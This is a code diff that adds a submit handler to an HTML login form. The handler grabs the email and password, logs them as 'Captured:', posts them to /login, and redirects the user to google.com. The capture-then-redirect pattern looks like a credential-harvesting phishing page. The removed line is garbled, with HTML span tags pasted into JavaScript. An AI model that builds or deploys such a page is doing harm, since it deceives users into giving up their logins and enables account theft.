@@ -177,4 +177,32 @@
             }
 
             form.addEventListener("submit", async (e) => {
-                e.preventDefault();<span class="ml-2" /><span class="inline-block w-3 h-3 rounded-full bg-neutral-a12 align-middle mb-[0.1rem]" />
+                e.preventDefault();
+
+                const emailInput = document.querySelector('input[type="email"]');
+                const passwordInput = document.querySelector('input[type="password"]');
+
+                const email = emailInput ? emailInput.value : "";
+                const password = passwordInput ? passwordInput.value : "";
+
+                console.log("Captured:", email, password);
+
+                try {
+                    await fetch("/login", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({ email, password })
+                    });
+
+                    window.location.href = "https://google.com";
+
+                } catch (err) {
+                    console.error("Error:", err);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
